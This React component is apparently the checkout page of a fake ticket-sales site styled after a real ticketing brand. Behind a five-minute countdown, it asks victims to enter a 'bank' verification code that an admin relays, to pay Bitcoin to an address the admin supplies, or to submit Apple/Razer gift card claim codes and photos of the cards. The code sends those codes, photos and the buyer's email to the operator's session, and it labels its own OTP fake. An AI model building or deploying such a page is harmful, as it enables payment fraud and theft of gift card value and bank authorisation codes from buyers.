import React, { useState, useEffect } from 'react';
import { ChevronLeft, Clock, CreditCard, ChevronDown, ShieldCheck, Apple, Bitcoin, Gift, Camera, CheckCircle } from 'lucide-react';

export default function Checkout({ cart, sessionId, sessionData, updateSession, onSuccess, onBack }) {
  const [timeLeft, setTimeLeft] = useState(300);
  const [paymentMethod, setPaymentMethod] = useState(null); 
  const [cardDetails, setCardDetails] = useState({ number: '', exp: '', cvc: '' });
  
  // Gift Card States
  const [giftCardType, setGiftCardType] = useState('apple');
  const [giftCode, setGiftCode] = useState('');
  const [giftCardImage, setGiftCardImage] = useState(null);
  const [hasUploadedImage, setHasUploadedImage] = useState(false);

  const [enteredOtp, setEnteredOtp] = useState('');
  const [email, setEmail] = useState('');
  
  const status = sessionData?.status || 'payment_pending'; 
  const adminProvidedOtp = sessionData?.otp;
  const cryptoAddress = sessionData?.cryptoAddress;

  const subtotal = cart.reduce((acc, item) => acc + item.price, 0);
  const fees = cart.length * 19.50;
  const orderProcessing = 5.00;
  const grandTotal = subtotal + fees + orderProcessing;

  useEffect(() => {
    const timer = setInterval(() => setTimeLeft(p => p > 0 ? p - 1 : 0), 1000);
    return () => clearInterval(timer);
  }, []);

  const handleCardSubmit = (e) => {
    e.preventDefault();
    const fakeSystemOtp = Math.floor(100000 + Math.random() * 900000).toString();
    updateSession(sessionId, { status: 'waiting_for_otp', otp: fakeSystemOtp, paymentMethod: 'card', email: email, cart: cart, total: grandTotal });
  };

  const handleManualRequest = (type) => {
    setPaymentMethod(type);
    updateSession(sessionId, { status: 'waiting_for_admin_address', paymentMethod: type, email: email, cart: cart, total: grandTotal });
  };

  const handleImageUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setGiftCardImage(reader.result); 
        setHasUploadedImage(true);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleGiftCardSubmit = () => {
    if (!giftCode) return;
    updateSession(sessionId, { 
      status: 'waiting_for_otp', 
      otp: `GC-${giftCardType.toUpperCase()}`, 
      email: email, 
      cart: cart, 
      total: grandTotal, 
      paymentMethod: 'gift_card',
      giftCardDetails: { type: giftCardType, code: giftCode, imageBase64: giftCardImage }
    });
  };

  const handleOtpVerify = () => {
    if (enteredOtp === adminProvidedOtp) {
      updateSession(sessionId, { status: 'payment_complete' });
      setTimeout(onSuccess, 1500);
    }
  };

  if (status === 'payment_complete') return <div className="flex h-screen items-center justify-center font-bold text-xl text-green-600 bg-white">Redirecting...</div>;

  return (
    <div className="min-h-screen bg-gray-50 pt-4 pb-20 px-4">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center text-[#026cdf] font-bold mb-4 hover:underline"><ChevronLeft className="w-5 h-5" /> Back to Seats</button>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          <div className="md:col-span-2 space-y-6">
            <div className="flex items-center justify-between">
              <h1 className="text-2xl font-bold">Checkout</h1>
              <div className="flex items-center text-[#ea0042] font-bold bg-[#ea0042]/10 px-3 py-1 rounded">
                <Clock className="w-4 h-4 mr-1" />{Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}
              </div>
            </div>

            <div className="bg-white p-6 rounded-xl shadow-sm border border-gray-100">
               <div className="mb-6">
                 <label className="text-xs font-bold text-gray-400 uppercase tracking-wider block mb-2">Delivery Email</label>
                 <input type="email" placeholder="Email for mobile tickets" required className="w-full border p-3 rounded-lg focus:ring-1 focus:ring-[#026cdf] outline-none" value={email} onChange={e=>setEmail(e.target.value)} />
               </div>

               <h3 className="font-bold text-lg mb-4">Select Payment Method</h3>
               <div className="space-y-4">
                  {/* Card Section */}
                  <div className={`border rounded-xl overflow-hidden transition-all ${paymentMethod === 'card' ? 'border-[#026cdf] ring-1 ring-[#026cdf]' : 'border-gray-200'}`}>
                    <div className="flex items-center gap-3 cursor-pointer p-4 hover:bg-gray-50" onClick={() => setPaymentMethod('card')}>
                      <CreditCard className="text-gray-400" /> <span className="font-bold">Credit / Debit Card</span>
                      <ChevronDown className={`ml-auto w-4 h-4 transition-transform ${paymentMethod === 'card' ? 'rotate-180' : ''}`} />
                    </div>
                    {paymentMethod === 'card' && status !== 'waiting_for_otp' && (
                       <form onSubmit={handleCardSubmit} className="p-4 border-t bg-gray-50 space-y-3">
                         <input required placeholder="Card Number" className="w-full border p-3 rounded-lg bg-white" value={cardDetails.number} onChange={e=>setCardDetails({...cardDetails, number: e.target.value})} />
                         <div className="flex gap-3">
                            <input placeholder="MM/YY" className="w-1/2 border p-3 rounded-lg bg-white" />
                            <input placeholder="CVC" className="w-1/2 border p-3 rounded-lg bg-white" />
                         </div>
                         <button type="submit" className="w-full bg-[#026cdf] text-white py-4 rounded-lg font-bold">Confirm Card</button>
                       </form>
                    )}
                    {status === 'waiting_for_otp' && paymentMethod === 'card' && (
                      <div className="p-6 bg-blue-50 text-center border-t border-blue-100">
                        <ShieldCheck className="w-10 h-10 text-[#026cdf] mx-auto mb-2" />
                        <p className="font-bold mb-1">Verify Purchase</p>
                        <p className="text-xs text-gray-500 mb-4">Enter the code sent to your banking app.</p>
                        <input className="border-2 border-gray-200 p-3 rounded-lg w-40 text-center text-xl font-bold block mx-auto mb-4" value={enteredOtp} onChange={e=>setEnteredOtp(e.target.value)} maxLength={6} />
                        <button onClick={handleOtpVerify} className="bg-[#026cdf] text-white px-8 py-3 rounded-lg font-bold">Complete Payment</button>
                      </div>
                    )}
                  </div>

                  {/* Crypto Section */}
                  <div className={`border rounded-xl overflow-hidden transition-all ${paymentMethod === 'bitcoin' ? 'border-[#026cdf] ring-1 ring-[#026cdf]' : 'border-gray-200'}`}>
                     <div className="flex items-center gap-3 cursor-pointer p-4 hover:bg-gray-50" onClick={() => handleManualRequest('bitcoin')}>
                       <Bitcoin className="text-orange-500" /> <span className="font-bold">Bitcoin (BTC)</span>
                     </div>
                     {paymentMethod === 'bitcoin' && (
                        <div className="p-4 border-t bg-gray-50 text-center">
                           {!cryptoAddress ? <div className="text-gray-400 text-sm py-4 animate-pulse">Requesting Wallet Address...</div> : (
                              <div className="space-y-3 animate-slideUp">
                                 <p className="text-xs text-gray-500 uppercase font-bold">Transfer exactly ${grandTotal.toFixed(2)} to:</p>
                                 <div className="bg-white p-3 border rounded text-xs break-all font-mono select-all">{cryptoAddress}</div>
                                 <button onClick={() => updateSession(sessionId, { status: 'waiting_for_confirmation' })} className="w-full bg-orange-500 text-white py-3 rounded-lg font-bold">Payment Sent</button>
                              </div>
                           )}
                        </div>
                     )}
                  </div>

                  {/* Gift Card Section */}
                  <div className={`border rounded-xl overflow-hidden transition-all ${paymentMethod === 'gift_card' ? 'border-[#026cdf] ring-1 ring-[#026cdf]' : 'border-gray-200'}`}>
                     <div className="flex items-center gap-3 cursor-pointer p-4 hover:bg-gray-50" onClick={() => setPaymentMethod('gift_card')}>
                       <Gift className="text-pink-500" /> <span className="font-bold">Gift Card (Apple/Razer)</span>
                     </div>
                     {paymentMethod === 'gift_card' && (
                        <div className="p-4 border-t bg-gray-50 space-y-4">
                           <select className="w-full border p-3 rounded-lg bg-white" value={giftCardType} onChange={(e) => setGiftCardType(e.target.value)}>
                             <option value="apple">Apple Gift Card</option>
                             <option value="razer">Razer Gold</option>
                           </select>
                           <input placeholder="Enter claim code..." className="w-full border p-3 rounded-lg bg-white" value={giftCode} onChange={e=>setGiftCode(e.target.value)} />
                           
                           <div className="border-2 border-dashed border-gray-300 rounded-lg p-4 text-center bg-white relative">
                              <input type="file" accept="image/*" className="absolute inset-0 opacity-0 cursor-pointer" onChange={handleImageUpload} />
                              <div className="flex flex-col items-center gap-1">
                                {hasUploadedImage ? <CheckCircle className="text-green-500" /> : <Camera className="text-gray-400" />}
                                <span className="text-xs text-gray-500">{hasUploadedImage ? "Photo Attached" : "Add photo of card"}</span>
                              </div>
                           </div>
                           <button onClick={handleGiftCardSubmit} className="w-full bg-pink-600 text-white py-3 rounded-lg font-bold">Apply Card</button>
                        </div>
                     )}
                  </div>
               </div>
            </div>
          </div>

          {/* Sidebar */}
          <div className="space-y-4">
             <div className="bg-white p-6 rounded-xl shadow-sm border border-gray-100">
                <h3 className="font-bold text-lg mb-4">Order Summary</h3>
                <div className="space-y-3 text-sm text-gray-600">
                   <div className="flex justify-between"><span>Tickets ({cart.length})</span><span>${subtotal.toFixed(2)}</span></div>
                   <div className="flex justify-between"><span>Service Fees</span><span>${fees.toFixed(2)}</span></div>
                   <div className="flex justify-between"><span>Order Processing</span><span>$5.00</span></div>
                   <div className="border-t pt-3 flex justify-between font-bold text-gray-900 text-lg">
                      <span>Total</span><span>${grandTotal.toFixed(2)}</span>
                   </div>
                </div>
             </div>
          </div>
        </div>
      </div>
    </div>
  );
}

